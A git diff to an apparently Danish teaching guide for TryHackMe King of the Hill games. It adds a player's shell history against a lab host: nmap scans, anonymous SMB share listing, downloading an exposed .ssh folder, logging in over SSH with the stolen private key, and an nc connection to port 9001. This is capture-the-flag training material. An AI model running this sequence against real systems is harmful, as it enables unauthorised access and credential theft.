@@ -120,7 +120,31 @@ Efter runden skal du kunne besvare tre spørgsmål:
 
 *Kilder: [TryHackMe KoTH](https://tryhackme.com/games/koth) · [KoTH-regler](https://help.tryhackme.com/en/articles/6498315-king-of-the-hill-overview) · [Maskinnoter](https://github.com/andracs/koth-vejledning) · [MITRE ATT&CK](https://attack.mitre.org/)*
 
-# En venlig KOTH spillers history fra undervisningen
+# András' commands fra konkurrencen
+
+  631  vibe
+  632  ping 10.10.47.66
+  633  openvpn '/home/kali/Downloads/eu-west-1-andyhudk-premium.ovpn' 
+  634  vibe
+  635  ls
+  636  cat flag.txt
+  637  cat authorized_keys
+  638  chmod 600 id_rsa
+  639  ssh -i id_rsa ashu@10.10.47.66
+  640  ping 10.10.47.66
+  641  nmap -p- --open 10.10.47.66
+  642  nmap -sV -sC -p 21,22,139,445,9001,9002 10.10.47.66
+  643  nmap -sV -sC 10.10.47.66
+  644  ftp ftp 10.10.47.66
+  645  ftp 10.10.47.66
+  646  smbclient -L //10.10.47.66 -N
+  647  smbclient //10.10.47.66/key -N
+  648  smbget -R smb://10.10.47.66/key/.ssh -n
+  649  smbclient //10.10.47.66/key -N
+  650  nc 10.10.47.66 9001
+  651  ls
+
+# En venlig KOTH-spillers history fra undervisningen
 map -Pn -T4 --top-ports 1000 -sV 10.10.47.66 -oN nmap.txt
 
 ftp 10.10.47.66
